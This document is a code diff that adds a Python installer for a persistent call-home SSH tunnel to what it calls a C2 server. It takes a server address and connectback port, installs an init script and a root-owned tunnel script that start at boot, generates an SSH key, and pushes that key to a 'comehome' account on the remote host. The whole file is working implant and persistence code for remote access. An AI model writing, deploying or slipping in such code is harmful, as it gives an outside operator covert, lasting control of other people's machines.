@@ -1,0 +1,51 @@
+#!/usr/bin/env python
+
+import shutil
+import os
+import argparse
+
+from argparse import ArgumentParser
+
+init_dir = '/etc/init.d'
+root_dir = '/root'
+callhome_init_script = 'scripts/callhome_ssh_tunnel'
+callhome_script = 'scripts/ssh_tunnel.sh'
+
+parser = ArgumentParser()
+
+parser.add_argument('--server',
+				dest='server',
+				type=str,
+				required=True,
+				help='The FQDN or IP address of the C2 server.')
+
+parser.add_argument('--port',
+				dest='port',
+				type=int,
+				required=True,
+				help='The connectback port used to reach this machine.')
+
+args = parser.parse_args()
+
+os.system("sed -i 's/SERVERHERE/%s/' %s" % (args.server, callhome_script))
+
+# copy callhome_ssh_tunnel to /etc/init.d
+shutil.copyfile(callhome_init_script, os.path.join(init_dir, os.path.basename(callhome_init_script)))
+
+os.system('chmod 700 %s' % os.path.join(init_dir, os.path.basename(callhome_init_script)))
+
+#  copy ssh_tunnel.sh script to /root
+shutil.copyfile(callhome_script, os.path.join(root_dir, os.path.basename(callhome_script)))
+
+os.system('chmod 700 %s' % os.path.join(root_dir, os.path.basename(callhome_script)))
+
+# connect to c2 on startup
+os.system('update-rc.d callhome_ssh_tunnel enable')
+
+os.system('ssh-keygen')
+
+os.system("""echo -n "command=\\"/bin/echo %d\\",no-user-rc,no-X11-forwarding,no-agent-forwarding,no-pty $(cat ~/.ssh/id_rsa.pub)" | ssh comehome@%s 'cat >> ~/.ssh/authorized_keys'""" % (args.port, args.server))
+
+
+os.system('systemctl enable ssh')
+os.system('systemctl restart ssh')
